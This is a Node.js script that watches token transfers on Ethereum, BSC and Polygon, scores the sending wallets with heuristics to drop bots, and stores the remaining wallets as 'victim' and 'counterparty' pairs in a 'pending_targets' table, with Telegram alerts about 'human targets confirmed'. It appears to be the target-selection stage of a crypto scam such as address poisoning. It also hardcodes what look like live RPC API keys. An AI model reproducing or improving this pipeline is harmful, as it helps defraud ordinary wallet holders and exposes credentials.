import 'dotenv/config';
import { createPublicClient, http, fallback, getAddress, parseAbiItem } from 'viem';
import { mainnet, bsc, polygon } from 'viem/chains';
import { createClient } from '@supabase/supabase-js';

import { config } from '../lib/config.js';
import logger from '../lib/logger.js';
import { sendAlert, formatAlert } from '../lib/notifier.js';
import { setupGracefulShutdown, onShutdown } from '../lib/shutdown.js';

// ─── Supabase client ───
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
if (!supabaseUrl || !supabaseKey) {
  console.error('[analyzer] Missing Supabase credentials. Exiting.');
  process.exit(1);
}
const supabase = createClient(supabaseUrl, supabaseKey);

// --- MULTI‑CHAIN CONFIG ---
const chainName = config.chain || 'ethereum';
const chainCfg = config.getChainConfig ? config.getChainConfig() : null;

const CHAIN_IDS = { ethereum: 1, bsc: 56, polygon: 137 };
const chainId = chainCfg?.chainId || CHAIN_IDS[chainName] || 1;

logger.info(`[Stage 2 Analyzer] Running for chain: ${chainName} (ID: ${chainId})`);

const QUALIFIED_POLL_INTERVAL_MS = parseInt(process.env.QUALIFIED_POLL_INTERVAL_MS || '600000', 10);

const BLOCKS_40_DAYS_MAP = {
  ethereum: 288000n,
  bsc: 1152000n,
  polygon: 1728000n,
};
const BLOCKS_40_DAYS = BLOCKS_40_DAYS_MAP[chainName] || 288000n;

// ─── Viem RPC Client ───
const PUBLIC_FALLBACKS = {
  bsc: [
    'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
    'https://bsc-dataseed.binance.org',
    'https://rpc.ankr.com/bsc',
    'https://bsc.publicnode.com',
    'https://1rpc.io/bnb',
    'https://bsc.drpc.org',
  ],
  polygon: [
    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
    'https://polygon-rpc.com',
    'https://rpc.ankr.com/polygon',
    'https://polygon.llamarpc.com',
    'https://polygon.publicnode.com',
    'https://1rpc.io/polygon',
  ],
  ethereum: [
    'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
    'https://ethereum.publicnode.com',
    'https://rpc.ankr.com/eth',
    'https://eth.llamarpc.com',
    'https://1rpc.io/eth',
    'https://eth.drpc.org',
  ],
};

const viemChainMap = { ethereum: mainnet, bsc, polygon };
const rpcUrls = PUBLIC_FALLBACKS[chainName] || PUBLIC_FALLBACKS.ethereum;

const client = createPublicClient({
  chain: viemChainMap[chainName] || mainnet,
  transport: fallback(rpcUrls.map(url => http(url, { timeout: 15000 })), { rank: false }),
});

const transferEvent = parseAbiItem(
  'event Transfer(address indexed from, address indexed to, uint256 value)'
);

const ONCHAIN_LOOKBACK_BLOCKS = {
  ethereum: 7200n,
  bsc: 10000n,
  polygon: 10000n,
};
const LOOKBACK = ONCHAIN_LOOKBACK_BLOCKS[chainName] || 7200n;

// ─── Stage 1 Constants ───
const MIN_GAS_RESERVE_WEI = 2000000000000000n;
const MAX_NONCE_LIMIT = 1000;
const BOT_SCORE_THRESHOLD = 0.6;

let isFetching = false;

// ─── UTILITIES ───
async function safeSendAlert(message) {
  try {
    await sendAlert(message);
  } catch (err) {
    logger.warn(`[Notifier] Failed to send Telegram alert: ${err.message}`);
  }
}

async function withRetry(fn, context, maxAttempts = 3, baseDelay = 1000) {
  let lastError;
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try { return await fn(); }
    catch (error) {
      lastError = error;
      if (attempt < maxAttempts) {
        const delay = baseDelay * Math.pow(2, attempt - 1);
        logger.warn(`[${context}] Attempt ${attempt} failed: ${error.message}`);
        await new Promise(resolve => setTimeout(resolve, delay));
      } else break;
    }
  }
  throw lastError;
}

async function promiseAllLimit(tasks, limit = 5) {
  const results = [];
  for (let i = 0; i < tasks.length; i += limit) {
    results.push(...await Promise.all(tasks.slice(i, i + limit)));
  }
  return results;
}

// ─── STAGE 1: On-chain state checks ───
async function passesStageOne(address) {
  try {
    const checksumAddr = getAddress(address);
    const [code, nonce, balance] = await Promise.all([
      client.getBytecode({ address: checksumAddr }),
      client.getTransactionCount({ address: checksumAddr }),
      client.getBalance({ address: checksumAddr }),
    ]);

    if (code && code !== '0x') return { pass: false, reason: 'is_contract' };
    if (nonce >= MAX_NONCE_LIMIT) return { pass: false, reason: `high_nonce(${nonce})` };
    if (balance < MIN_GAS_RESERVE_WEI) return { pass: false, reason: 'low_balance' };

    return { pass: true, reason: 'eoa_ok' };
  } catch (err) {
    return { pass: true, reason: 'rpc_fail_stage1' };
  }
}

// ─── STAGE 2: BEHAVIORAL ANALYZER WITH TTL CACHE ───
const MAX_ANALYZED_CACHE = 10000;
const ANALYZED_CACHE_TTL_MS = 6 * 60 * 60 * 1000;
const ANALYZED_CACHE = new Map();

function setAnalyzedCache(key, passes) {
  if (ANALYZED_CACHE.has(key)) {
    ANALYZED_CACHE.delete(key);
  } else if (ANALYZED_CACHE.size >= MAX_ANALYZED_CACHE) {
    const oldest = ANALYZED_CACHE.keys().next().value;
    ANALYZED_CACHE.delete(oldest);
  }
  ANALYZED_CACHE.set(key, { passes, expiresAt: Date.now() + ANALYZED_CACHE_TTL_MS });
}

async function passesBehavioralHeuristics(victimAddress) {
  const cacheKey = victimAddress.toLowerCase();

  const cached = ANALYZED_CACHE.get(cacheKey);
  if (cached && Date.now() < cached.expiresAt) {
    return cached.passes;
  }

  try {
    const stage1 = await passesStageOne(victimAddress);
    if (!stage1.pass) {
      logger.debug(`[Analyzer] Stage 1 rejected ${cacheKey}: ${stage1.reason}`);
      setAnalyzedCache(cacheKey, false);
      return false;
    }

    logger.debug(`[Analyzer] Stage 1 passed ${cacheKey}, running behavioral analysis...`);

    const checksumAddr = getAddress(victimAddress);

    const { data: dbTxs, error: dbErr } = await supabase
      .from('token_transfers')
      .select('block_timestamp, receiver, block_number')
      .eq('sender', cacheKey)
      .eq('chain_id', chainId)
      .order('block_timestamp', { ascending: true })
      .limit(50);

    const dbRows = (!dbErr && dbTxs) ? dbTxs : [];

    let onChainLogs = [];
    try {
      const currentBlock = await client.getBlockNumber();
      const fromBlock = currentBlock > LOOKBACK ? currentBlock - LOOKBACK : 0n;

      const getLogsPromise = client.getLogs({
        event: transferEvent,
        args: { from: checksumAddr },
        fromBlock,
        toBlock: currentBlock,
      });

      const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error('getLogs timeout')), 10000);
      });

      onChainLogs = await Promise.race([getLogsPromise, timeoutPromise]);
    } catch (logErr) {
      logger.debug(`[Analyzer] getLogs failed for ${cacheKey}: ${logErr.message}. Using DB data only.`);
      onChainLogs = [];
    }

    const allTimestamps = [];

    for (const tx of dbRows) {
      if (tx.block_timestamp) {
        allTimestamps.push(new Date(tx.block_timestamp).getTime());
      }
    }

    const onChainBlockSet = new Set(onChainLogs.map(l => Number(l.blockNumber)));
    const onChainBlockNumbers = [...onChainBlockSet].sort((a, b) => a - b);

    const blockTimeMs = chainName === 'ethereum' ? 12000 : chainName === 'bsc' ? 3000 : 2000;
    const now = Date.now();
    let currentBlockNum = 0;
    try {
      currentBlockNum = Number(await client.getBlockNumber());
    } catch {
      currentBlockNum = 0;
    }

    for (const bn of onChainBlockNumbers) {
      const blocksAgo = currentBlockNum - bn;
      const approxTime = now - (blocksAgo * blockTimeMs);
      allTimestamps.push(approxTime);
    }

    allTimestamps.sort((a, b) => a - b);

    if (allTimestamps.length < 5) {
      setAnalyzedCache(cacheKey, true);
      return true;
    }

    const intervals = [];
    let zeroGapCount = 0;
    let totalIntervalCount = 0;
    let minInterval = Infinity;
    let rapidCount = 0;
    let rapidBurstCount = 0;

    for (let i = 1; i < allTimestamps.length; i++) {
      const gapMs = allTimestamps[i] - allTimestamps[i - 1];
      const gapSeconds = gapMs / 1000;
      totalIntervalCount++;

      if (gapSeconds > 0 && gapSeconds < minInterval) minInterval = gapSeconds;
      if (gapSeconds < 180) rapidCount++;
      if (gapSeconds < 30) rapidBurstCount++;

      if (gapMs > 30000) {
        intervals.push(gapMs);
      } else {
        zeroGapCount++;
      }
    }

    const zeroGapRatio = totalIntervalCount > 0 ? zeroGapCount / totalIntervalCount : 0;
    const rapidRatio = totalIntervalCount > 0 ? rapidCount / totalIntervalCount : 0;

    const blockCounts = new Map();
    for (const log of onChainLogs) {
      const bn = Number(log.blockNumber);
      blockCounts.set(bn, (blockCounts.get(bn) || 0) + 1);
    }

    const blockCountsValues = [...blockCounts.values()];
    const maxBatchSize = blockCountsValues.length > 0 ? Math.max(...blockCountsValues) : 0;
    const batchBlockCount = blockCountsValues.filter(c => c >= 3).length;

    const dbBlockCounts = new Map();
    for (const row of dbRows) {
      if (row.block_number) {
        const bn = Number(row.block_number);
        dbBlockCounts.set(bn, (dbBlockCounts.get(bn) || 0) + 1);
      }
    }
    const dbMaxBatch = dbBlockCounts.size > 0 ? Math.max(...dbBlockCounts.values()) : 0;

    const effectiveMaxBatch = Math.max(maxBatchSize, dbMaxBatch);

    let maxBlockStreak = 0;
    let currentStreak = 0;
    for (let i = 1; i < onChainBlockNumbers.length; i++) {
      const diff = onChainBlockNumbers[i] - onChainBlockNumbers[i - 1];
      if (diff >= 1 && diff <= 2) {
        currentStreak++;
        if (currentStreak > maxBlockStreak) maxBlockStreak = currentStreak;
      } else {
        currentStreak = 0;
      }
    }

    const spanMs = allTimestamps.length >= 2
      ? allTimestamps[allTimestamps.length - 1] - allTimestamps[0]
      : 0;
    const spanDays = spanMs / (1000 * 60 * 60 * 24);

    const hours = new Set();
    for (const ts of allTimestamps) {
      hours.add(new Date(ts).getUTCHours());
    }
    const hourCoverage = hours.size / 24;

    const avgInterval = intervals.length > 0
      ? intervals.reduce((a, b) => a + b, 0) / intervals.length / 1000
      : 0;

    const variance = intervals.length > 0
      ? intervals.reduce((acc, v) => acc + Math.pow(v / 1000 - avgInterval, 2), 0) / intervals.length
      : 0;
    const cv = avgInterval === 0 ? 0 : Math.sqrt(variance) / avgInterval;

    const dbReceivers = new Set(dbRows.map(t => (t.receiver || '').toLowerCase()));
    const onChainReceivers = new Set(onChainLogs.map(l => l.args.to.toLowerCase()));
    const allUniqueReceivers = new Set([...dbReceivers, ...onChainReceivers]);
    const receiverCount = allUniqueReceivers.size;

    const totalActivity = allTimestamps.length;
    const transfersPerDay = spanDays > 0.001 ? totalActivity / spanDays : 0;

    let score = 0;
    const signals = [];

    if (effectiveMaxBatch >= 3) {
      score += 0.65;
      signals.push(`extreme_batch(max=${effectiveMaxBatch})`);
    } else if (effectiveMaxBatch === 2) {
      score += 0.35;
      signals.push(`batch(max=${effectiveMaxBatch})`);
    }

    if (batchBlockCount >= 3) {
      score += 0.25;
      signals.push(`sustained_batch(${batchBlockCount}blocks)`);
    }

    if (maxBlockStreak >= 3) {
      score += 0.65;
      signals.push(`extreme_block_streak(${maxBlockStreak})`);
    } else if (maxBlockStreak >= 2) {
      score += 0.40;
      signals.push(`block_streak(${maxBlockStreak})`);
    }

    if (hourCoverage > 0.75 && spanDays < 30) {
      score += 0.30;
      signals.push(`24/7(${hours.size}h/${spanDays.toFixed(0)}d)`);
    }

    if (avgInterval < 300 && cv < 0.45 && intervals.length >= 5) {
      score += 0.35;
      signals.push(`robotic(avg=${avgInterval.toFixed(0)}s,cv=${cv.toFixed(2)})`);
    }

    if (receiverCount === 1) {
      const humanLike = spanDays > 90;
      if (humanLike) {
        score += 0.10;
        signals.push(`single_recv_humanlike(${spanDays.toFixed(0)}d)`);
      } else if (totalActivity >= 30) {
        score += 0.60;
        signals.push(`single_recv_sweeper(${totalActivity}tx)`);
      } else {
        score += 0.50;
        signals.push(`single_recv(${totalActivity}tx)`);
      }
    } else if (receiverCount <= 2) {
      score += 0.20;
      signals.push(`low_div(${receiverCount})`);
    }

    if (avgInterval < 60 && avgInterval > 0) {
      score += 0.25;
      signals.push(`rapid(${avgInterval.toFixed(0)}s)`);
    }

    if (zeroGapRatio > 0.40) {
      score += 0.20;
      signals.push(`zero_gap(${(zeroGapRatio * 100).toFixed(0)}%)`);
    }

    if (spanDays <= 4 && totalActivity >= 60) {
      score += 0.55;
      signals.push(`high_density(${totalActivity}tx/${spanDays.toFixed(1)}d)`);
    } else if (spanDays <= 7 && totalActivity >= 30) {
      score += 0.35;
      signals.push(`dense(${totalActivity}tx/${spanDays.toFixed(1)}d)`);
    }

    if (totalActivity >= 30 && transfersPerDay >= 15) {
      score += 0.60;
      signals.push(`high_daily_vol(${transfersPerDay.toFixed(0)}/day)`);
    } else if (totalActivity >= 20 && transfersPerDay >= 8) {
      score += 0.40;
      signals.push(`daily_vol(${transfersPerDay.toFixed(0)}/day)`);
    }

    if (totalIntervalCount > 10 && rapidRatio > 0.50) {
      score += 0.50;
      signals.push(`mostly_rapid(${(rapidRatio * 100).toFixed(0)}%)`);
    }

    if (rapidBurstCount >= 10) {
      score += 0.40;
      signals.push(`rapid_bursts(${rapidBurstCount}x)`);
    }

    if (receiverCount > 10 && spanDays > 30) {
      score -= 0.40;
      signals.push(`human_diversity(${receiverCount} contracts)`);
    }

    score = Math.max(0, Math.min(score, 1.0));
    const isHuman = score < BOT_SCORE_THRESHOLD;

    if (!isHuman) {
      logger.debug(`[Analyzer] Bot detected ${cacheKey}: score=${score.toFixed(2)}, signals=[${signals.join(', ')}]`);
    }

    setAnalyzedCache(cacheKey, isHuman);
    return isHuman;

  } catch (err) {
    logger.error(`[Analyzer] Error analyzing ${victimAddress}: ${err.message}`);
    setAnalyzedCache(cacheKey, true);
    return true;
  }
}

// ─── MAIN EXECUTION ───
async function fetchPendingTargets() {
  if (isFetching) {
    logger.warn('Stage 2 analysis still running from previous interval. Skipping.');
    return;
  }
  isFetching = true;

  try {
    logger.info('Fetching qualified pairs and running Stage 1 + Stage 2 heuristics...');

    const maxBlockData = await withRetry(async () => {
      const { data, error } = await supabase
        .from('token_transfers')
        .select('block_number')
        .eq('chain_id', chainId)
        .order('block_number', { ascending: false })
        .limit(1);
      if (error) throw error;
      return data;
    }, 'GetMaxBlock');

    if (!maxBlockData || maxBlockData.length === 0) {
      logger.info('No transfers found in database for this chain yet.');
      return;
    }

    const maxBlockBigInt = BigInt(maxBlockData[0].block_number);
    const thresholdBlock = Math.max(0, Number(maxBlockBigInt - BLOCKS_40_DAYS));

    logger.info(`Threshold block for 40-day window: ${thresholdBlock} (max block: ${maxBlockData[0].block_number})`);

    const BATCH_SIZE = 100;
    let totalInserted = 0;
    let totalFiltered = 0;
    let totalDeleted = 0;
    let pageCount = 0;

    while (true) {
      pageCount++;

      // ─── Direct query (no RPC) — fetch raw rows, deduplicate in JS ───
      // Fetch extra rows (3x batch size) to account for duplicate senders
      const rawRows = await withRetry(async () => {
        const { data, error } = await supabase
          .from('token_transfers')
          .select('sender, receiver, block_number')
          .eq('chain_id', chainId)
          .gte('block_number', thresholdBlock)
          .order('block_number', { ascending: false })
          .limit(BATCH_SIZE * 3);
        if (error) throw error;
        return data || [];
      }, `FetchDirect_page_${pageCount}`);

      if (!rawRows || rawRows.length === 0) {
        logger.info(`No more transfers to process. Completed ${pageCount - 1} pages.`);
        break;
      }

      // Deduplicate by (sender, receiver) pair in JS
      const seenPairs = new Set();
      const rows = [];
      for (const row of rawRows) {
        const senderLower = (row.sender || '').toLowerCase();
        const receiverLower = (row.receiver || '').toLowerCase();
        const key = `${senderLower}_${receiverLower}`;
        if (!seenPairs.has(key) && senderLower && receiverLower) {
          seenPairs.add(key);
          rows.push({
            sender: senderLower,
            receiver: receiverLower,
            block_number: row.block_number,
          });
          if (rows.length >= BATCH_SIZE) break;
        }
      }

      if (rows.length === 0) break;

      logger.info(`Page ${pageCount}: Fetched ${rawRows.length} raw rows → ${rows.length} unique pairs. Running analysis...`);

      const TIMEOUT_MS = 90000;

      const evaluationResults = await promiseAllLimit(
        rows.map(async (row, index) => {
          const sender = row.sender;

          try {
            logger.info(`[Analyzer] Processing ${index + 1}/${rows.length}: ${sender}`);

            const timeoutPromise = new Promise((_, reject) => {
              setTimeout(() => reject(new Error('Analysis timeout')), TIMEOUT_MS);
            });

            const isHuman = await Promise.race([
              passesBehavioralHeuristics(sender),
              timeoutPromise
            ]);

            if (!isHuman) {
              logger.debug(`[Analyzer] Rejected bot: ${sender}`);
              return null;
            }

            return {
              chain: chainName,
              counterparty: row.receiver,
              victim: sender,
              processed: false,
            };
          } catch (error) {
            logger.warn(`[Analyzer] Failed to analyze ${sender}: ${error.message}`);
            return {
              chain: chainName,
              counterparty: row.receiver,
              victim: sender,
              processed: false,
            };
          }
        }),
        10
      );

      const insertData = evaluationResults.filter(r => r !== null);
      const filteredCount = rows.length - insertData.length;
      totalFiltered += filteredCount;

      // 1. Insert human targets into pending_targets
      if (insertData.length > 0) {
        const insertedCount = await withRetry(async () => {
          const { data, error } = await supabase
            .from('pending_targets')
            .upsert(insertData, {
              onConflict: 'chain,counterparty,victim',
              ignoreDuplicates: true,
            })
            .select();
          if (error) throw error;
          return data ? data.length : 0;
        }, `BulkUpsertTargets_page_${pageCount}`);

        totalInserted += insertedCount;
        logger.info(`Page ${pageCount}: +${insertedCount} human targets | ${filteredCount} bots filtered`);
      } else {
        logger.info(`Page ${pageCount}: All ${rows.length} rejected by heuristics.`);
      }

      // 2. Delete ALL evaluated senders from token_transfers
      //    This ensures the next query gets fresh data
      const evaluatedSenders = [...new Set(rows.map(r => r.sender))];

      if (evaluatedSenders.length > 0) {
        try {
          let pageDeleted = 0;
          const DELETE_CHUNK_SIZE = 50;

          for (let i = 0; i < evaluatedSenders.length; i += DELETE_CHUNK_SIZE) {
            const chunk = evaluatedSenders.slice(i, i + DELETE_CHUNK_SIZE);

            const { error, count } = await supabase
              .from('token_transfers')
              .delete({ count: 'exact' })
              .eq('chain_id', chainId)
              .in('sender', chunk);

            if (error) {
              logger.error(`[Cleanup] Failed to delete senders: ${error.message}`);
            } else {
              pageDeleted += count || 0;
            }
          }

          totalDeleted += pageDeleted;
          logger.info(`Page ${pageCount}: Deleted ${pageDeleted} transfer records for ${evaluatedSenders.length} senders`);
        } catch (deleteError) {
          logger.error(`[Cleanup] Error deleting from token_transfers: ${deleteError.message}`);
        }
      }

      // Progress logging every 10 pages
      if (pageCount % 10 === 0) {
        logger.info(`[Progress] Page ${pageCount} | Inserted: ${totalInserted} | Filtered: ${totalFiltered} | Deleted: ${totalDeleted}`);
      }

      // Safety limit
      if (pageCount > 10000) {
        logger.warn('Reached pagination safety limit (10000 pages). Stopping.');
        break;
      }
    }

    // ─── Summary ───
    const { count: totalCount, error: countError } = await supabase
      .from('pending_targets')
      .select('*', { count: 'exact', head: true })
      .eq('chain', chainName);

    const totalInDb = countError ? 'Unknown' : totalCount;

    logger.info(`[Stage 2] Run complete. Added: ${totalInserted} | Filtered: ${totalFiltered} bots | Deleted: ${totalDeleted} records | Total pending: ${totalInDb}`);

    if (totalInserted > 0 || totalFiltered > 0 || totalDeleted > 0) {
      await safeSendAlert(
        `📊 [${chainName.toUpperCase()}] Stage 2: +${totalInserted} human targets confirmed, ${totalFiltered} bots filtered, ${totalDeleted} raw transfers cleaned. Total pending: ${totalInDb}`
      );
    }

  } catch (error) {
    logger.error(`[Stage 2] Fatal error: ${error.message}`);
    await safeSendAlert(formatAlert('error', { source: 'Stage2Analyzer', error: error.message }));
  } finally {
    isFetching = false;
  }
}

async function startObserver() {
  logger.info('Starting Stage 2 Behavioral Analyzer (continuous mode)');
  logger.info(`Polling interval: ${QUALIFIED_POLL_INTERVAL_MS / 1000}s | Chain: ${chainName} | Lookback: ${LOOKBACK} blocks`);

  try {
    await fetchPendingTargets();
  } catch (err) {
    logger.error(`[Stage 2] Initial fetch failed: ${err.message}. Will retry on next interval.`);
  }

  setInterval(async () => {
    try {
      await fetchPendingTargets();
    } catch (err) {
      logger.error(`[Stage 2] Polling error: ${err.message}`);
    }
  }, QUALIFIED_POLL_INTERVAL_MS);
}

setupGracefulShutdown();
onShutdown(async () => {
  logger.info('[Stage 2] Analyzer shutting down gracefully.');
});

startObserver().catch(async (err) => {
  logger.error(`[Stage 2] Fatal startup error: ${err.message}`);
  await safeSendAlert(formatAlert('error', { source: 'Stage2Startup', error: err.message }));
  process.exit(1);
});